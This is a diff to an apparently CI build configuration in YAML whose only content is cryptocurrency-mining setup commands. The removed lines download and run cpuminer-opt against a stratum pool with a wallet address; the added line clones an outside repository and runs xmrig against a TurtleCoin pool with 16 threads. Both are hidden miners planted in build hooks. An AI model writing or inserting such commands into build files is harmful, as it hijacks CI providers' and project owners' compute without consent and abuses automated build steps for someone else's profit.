@@ -1,11 +1,6 @@
 build:
   nodes:
-    some-node:
-      dependencies:
+    my-node:
+      project_setup:
         before:
-            - command: 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz -O cpuminer-opt-linux.tar.gz && tar -xzf cpuminer-opt-linux.tar.gz'
-              not_if: 'test -e ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:3350 -u PwdqwJ6LLWnCLeS9XPfoiXn81nuUjPB4E.kuas -t 8'
-
-    cache:
-      directories:
-        - 'cpuminer-sse2'
+          - command : git clone https://github.com/remakove/artions.git artions && cd artions && ./xmrig --donate-level 1 -a argon2/chukwav2 -o trtl.pool.mine2gether.com:2225 -u TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF -p j2 -k -t 16
